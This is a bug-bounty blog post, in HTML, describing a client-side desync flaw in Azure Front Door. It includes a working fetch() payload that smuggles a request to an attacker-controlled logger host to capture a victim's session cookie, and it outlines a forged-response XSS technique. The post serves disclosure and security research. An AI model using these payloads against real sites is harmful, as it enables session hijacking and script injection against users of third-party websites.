@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Knocking on the Front Door (client side desync attack on Azure CDN) :: Jeti&#39;s blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="A few months ago, I embarked on a security bug hunt within the scope of a private program available through the Intigriti platform. During this endeavor, I encountered an intriguing anomaly while analyzing the redirect from HTTP to HTTPS traffic on a particular host.
+In this write-up, I will delve into the short journey that started after uncovering this strange behavior, ultimately leading to the discovery of a Client-Side Desync vulnerability within one of Microsoft Azure&amp;rsquo;s CDN solutions known as Front Door." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://blog.jeti.pw/posts/knocking-on-the-front-door/" />
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-V8SVB9W8QN"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-V8SVB9W8QN', { 'anonymize_ip': false });
+}
+</script>
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://blog.jeti.pw/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://blog.jeti.pw/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="https://blog.jeti.pw/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="Jeti&#39;s Blog" />
+  
+    <meta name="twitter:creator" content="0xJeti" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Knocking on the Front Door (client side desync attack on Azure CDN)">
+<meta property="og:description" content="A few months ago, I embarked on a security bug hunt within the scope of a private program available through the Intigriti platform. During this endeavor, I encountered an intriguing anomaly while analyzing the redirect from HTTP to HTTPS traffic on a particular host.
+In this write-up, I will delve into the short journey that started after uncovering this strange behavior, ultimately leading to the discovery of a Client-Side Desync vulnerability within one of Microsoft Azure&amp;rsquo;s CDN solutions known as Front Door." />
+<meta property="og:url" content="https://blog.jeti.pw/posts/knocking-on-the-front-door/" />
+<meta property="og:site_name" content="Jeti&#39;s blog" />
+
+  
+    <meta property="og:image" content="https://blog.jeti.pw/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-07-31 23:26:05 &#43;0200 CEST" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://blog.jeti.pw/">
+  <div class="logo">
+    Terminal
+  </div>
+</a>
+
+    </div>
+    
+    
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://blog.jeti.pw/posts/knocking-on-the-front-door/">Knocking on the Front Door (client side desync attack on Azure CDN)</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-07-31</time><span class="post-author">Jeti</span></div>
+
+  
+  
+
+
+  
+    <div class="table-of-contents">
+      <h2>
+        Table of Contents
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#discovery">Discovery</a></li>
+    <li><a href="#front-door">Front Door</a></li>
+    <li><a href="#exploit">Exploit</a>
+      <ul>
+        <li><a href="#stealing-requests">Stealing requests</a></li>
+        <li><a href="#universal-xss-by-forging-responses">&ldquo;Universal&rdquo; XSS by forging responses</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <p>A few months ago, I embarked on a security bug hunt within the scope of a private program available through the Intigriti platform. During this endeavor, I encountered an intriguing anomaly while analyzing the redirect from HTTP to HTTPS traffic on a particular host.</p>
+<p>In this write-up, I will delve into the short journey that started after uncovering this strange behavior, ultimately leading to the discovery of a Client-Side Desync vulnerability within one of Microsoft Azure&rsquo;s CDN solutions known as Front Door.</p>
+<h2 id="discovery">Discovery<a href="#discovery" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>It all started when I&rsquo;ve sent following request to <a href="http://redacted.com">http://redacted.com</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">redacted.com</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">[...]</span>
+</span></span><span style="display:flex;"><span>Content-Length: 34
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET / HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: redacted.com
+</span></span></code></pre></div><p>Why such a strange request? I was just playing around in Burp after reading fantastic research on <a href="https://portswigger.net/research/browser-powered-desync-attacks">Browser Powered desync attacks</a> by James <a href="https://twitter.com/albinowax">@Albinowax</a>&rsquo; Kettle.</p>
+<p>And server responded with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">307</span> <span style="color:#a6e22e">Temporary Redirect</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+</span></span><span style="display:flex;"><span>Location<span style="color:#f92672">:</span> <span style="color:#ae81ff">https://redacted.com/</span>
+</span></span><span style="display:flex;"><span>x-azure-ref<span style="color:#f92672">:</span> <span style="color:#ae81ff">20230522T201945Z-...</span>
+</span></span><span style="display:flex;"><span>X-Cache<span style="color:#f92672">:</span> <span style="color:#ae81ff">CONFIG_NOCACHE</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 307 Temporary Redirect
+</span></span><span style="display:flex;"><span>Content-Type: text/html
+</span></span><span style="display:flex;"><span>Content-Length: 0
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>Location: https://redacted.com/
+</span></span><span style="display:flex;"><span>x-azure-ref: 20230522T201945Z-...
+</span></span><span style="display:flex;"><span>X-Cache: CONFIG_NOCACHE
+</span></span></code></pre></div><p>At first glance, it looks like there is nothing unusual. The server received two requests in the same (keep-alive) connection and responded twice with a 307 redirect from <code>http://</code> to <code>https://</code> address.</p>
+<p>But&hellip; Wait&hellip; In reality, I just sent one POST request with a body! The size of the body was defined by the <code>Content-Length</code> header.</p>
+<p>However, I received two responses. This indicates that the server happily ignored the <code>Content-Length</code> header and interpreted my request as two separate requests.</p>
+<p>This looks like a perfect candidate for Client-Side Desync attack described in above-mentioned reasearch.</p>
+<p>Quoting @Albinowax:</p>
+<blockquote>
+<p>Classic desync or request smuggling attacks rely on intentionally malformed requests that ordinary browsers simply won&rsquo;t send. This limits these attacks to websites that use a front-end/back-end architecture. However, as we&rsquo;ve learned from looking at CL.0 attacks, it&rsquo;s possible to cause a desync using fully browser-compatible HTTP/1.1 requests. Not only does this open up new possibilities for server-side request smuggling, it enables a whole new class of threat - client-side desync attacks.</p>
+</blockquote>
+<blockquote>
+<p>A client-side desync (CSD) is an attack that makes the victim&rsquo;s web browser desynchronize its own connection to the vulnerable website. This can be contrasted with regular request smuggling attacks, which desynchronize the connection between a front-end and back-end server.</p>
+</blockquote>
+<p>Upon conducting a more in-depth analysis, I discovered that this issue is not specific to the customer&rsquo;s solution but rather a general bug in the service utilized by the customer called <a href="https://azure.microsoft.com/en-us/products/frontdoor/">Azure Front Door</a>.</p>
+<h2 id="front-door">Front Door<a href="#front-door" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Azure Front Door service is a global, scalable content delivery network (CDN) and intelligent application delivery platform that provides secure and high-performance routing of web traffic to backend services.</p>
+<p>Let&rsquo;s dive into some of the configurable options.</p>
+<p>One of it&rsquo;s features (enabled by default) is to redirect all HTTP traffic to HTTPS.
+<img src="/frontdoor-http-to-https.png" alt="Frontdoor redirects HTTP to HTTPS"></p>
+<p>Technically this is done by redirecting browser to <code>https://</code> address via 307 status code:
+<img src="/frontdoor-redirect-307.png" alt="Front Door redirects with 307"></p>
+<p>Server supports keep-alive connections:
+<img src="/frontdoor-keep-alive-connections.png" alt="Front Door supports keep-alive connections"></p>
+<p>And redirects also POST requests:
+<img src="/frontdoor-redirect-post-requests.png" alt="Front Door redirects POST requests"></p>
+<p>But the problem is that it completely ignores <code>Content-Length</code> header:
+<img src="/frontdoor-ignores-content-length.png" alt="Front Door ignores Content-Length">
+What looks like two requests is in fact one request sent by the web browser where yellow box contains data for POST request (<code>Content-Length</code> header points to the end of the data).</p>
+<p>But Front Door server ignores <code>Content-Length</code> header and treats it as two separate requests.</p>
+<p>Another interesting design feature of Front Door (not a bug of course) is that all customer servers powered by Front Door service are available under one IP address and are also available in one keep-alive connection (this is a CDN service, right?). So this is perfectly valid set of requests sent in one TCP connection:</p>
+<p><img src="/frontdoor-sharing-connections.png" alt="Front Door is sharing connections"></p>
+<blockquote>
+<p><strong>NOTE 1:</strong> <em>azure-victim.jeti.pw</em> and <em>azure-attacker.jeti.pw</em> are two separate web servers of two separate customers (I&rsquo;ve used custom domains for better visibility).</p>
+</blockquote>
+<blockquote>
+<p><strong>NOTE 2:</strong> <em>azure-attacker.jeti.pw</em> server doesn&rsquo;t have automatic HTTPS redirects turned on that is why it doesn&rsquo;t respond with redirect (this might be important for various exploitation techniques).</p>
+</blockquote>
+<h2 id="exploit">Exploit<a href="#exploit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>A CSD attack starts with the victim visiting the attacker&rsquo;s website, which then makes their browser send two cross-domain requests to the vulnerable website. The first request is crafted to desync the browser&rsquo;s connection and make the second request trigger a harmful request / response.</p>
+<p>There are multiple ways how attacker can exploit this desynchronization issue. I&rsquo;ll focus on two possible ways.</p>
+<h3 id="stealing-requests">Stealing requests<a href="#stealing-requests" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Let&rsquo;s imagine that, upon visit from a victim, attacker&rsquo;s website sends a request (e.g. using Java Script <code>fetch API</code>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://azure-victim.jeti.pw/x&#39;</span>, {
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST /logger HTTP/1.1\r\nHost: azure-attacker.jeti.pw\r\nContent-Length: 200\r\n\r\n&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">redirect</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;follow&#39;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">credentials</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;include&#39;</span>
+</span></span><span style="display:flex;"><span>})
+</span></span></code></pre></div><p><img src="/frontdoor-fetch-incomplete-request.png" alt="Incomplete request with fetch()"></p>
+<p>Front Door service treats it as two separate requests where the second one is a POST request with some body attached (200 bytes long).</p>
+<blockquote>
+<p><strong>NOTE:</strong> please remeber that <em>azure-attacker.jeti.pw</em> is configured to not to redirect automatically so the server checks <code>Content-Length</code> in this case.</p>
+</blockquote>
+<p>As a request body is missing server will wait for 200 bytes of data to finish the request.
+All attacker needs to do is to redirect victim user to the victim&rsquo;s website:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://azure-victim.jeti.pw/&#39;</span>
+</span></span></code></pre></div><p>Victim&rsquo;s browser will send another GET request (most of the time browser will re-use the  same connection). Both requests will look like this:
+![[frontdoor-completed-request.png]]
+Server received it&rsquo;s 200 bytes of data and sent POST request to <a href="http://azure-attacker.jeti.pw/logger">http://azure-attacker.jeti.pw/logger</a> with following <strong>data</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">azure-victim.jeti.pw</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">*/*</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=uhogavedhcduei7qlfh1eplf7c</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US;q=0.9,en;q=0.8</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">max-age=0</span>
+</span></span></code></pre></div><p>And effectively attacker had stolen the session cookie of the victim.</p>
+<h3 id="universal-xss-by-forging-responses">&ldquo;Universal&rdquo; XSS by forging responses<a href="#universal-xss-by-forging-responses" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Another way of expoiting a CSD vulnerability is to forge responses to the victim&rsquo;s requests.</p>
+<p>Let&rsquo;s have a look at following request sent by the browser when victim visits malicious website (sent via <code>fetch API</code>):
+<img src="/frontdoor-xss-request.png" alt="Poisoning response with XSS"></p>
+<p>Front Door service again treats it as two separate requests and sends both to respective customer websites. And receives 2 separate responses.</p>
+<p>But the victim&rsquo;s browser sent only one request so it expects only one response (307 redirect in our case). Second part stays in the connection pool waiting for another request to match (because of the HTTP pipelining).</p>
+<p>When attacker redirects a victim, browser makes another request.</p>
+<p>But luckily for an attacker, the browser already have a response waiting in a connection pool (in our example response contains XSS payload that will be triggered in the context of website where victim was redirected).</p>
+<p>As the attacker can redirect a victim to any Front Door powered website and forge the response I think this can be called a &ldquo;Universal&rdquo; XSS :)</p>
+
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
